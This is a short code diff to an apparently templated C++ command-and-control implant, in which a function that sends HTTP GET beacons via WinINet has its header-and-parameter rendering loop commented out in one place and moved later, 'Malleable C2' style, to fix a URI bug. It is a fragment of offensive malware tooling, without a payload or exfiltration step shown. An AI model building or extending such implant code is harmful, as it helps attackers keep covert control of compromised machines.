@@ -67,11 +67,11 @@ nlohmann::json get(std::string implant_uuid) {
     std::string request_body = ""; // NULL by default, as that's what the wininet wants
     std::wstring w_metadata(metadata.begin(), metadata.end()); //convert metadata str to w_metadata for winapi (wide)
 
-    // --- Add addtl headers/params as specified in mc2 ---
+    [# // --- Add addtl headers/params as specified in mc2 ---
     [%- for header_or_param in http_get_client_headers_or_parameters_list %]
     [[ render_add_headers_or_parameters(header_or_param) ]]
     [%- endfor %]
-    // --- end ---
+    // --- end --- #]
 
 
     //where to store metadata - note, could macro this?
@@ -126,6 +126,12 @@ nlohmann::json get(std::string implant_uuid) {
     [%- endif %]
 
     // --- End Malleable C2 Metadata transport method ---
+
+    // --- Add addtl headers/params as specified in mc2 b4 sending off. Placed ehre to fix URI bug too---
+    [%- for header_or_param in http_get_client_headers_or_parameters_list %]
+    [[ render_add_headers_or_parameters(header_or_param) ]]
+    [%- endfor %]
+    // --- end --- 
 
     // Call the HTTP_GET
     // Note: We pass the constructed 'uri' and 'headers' here
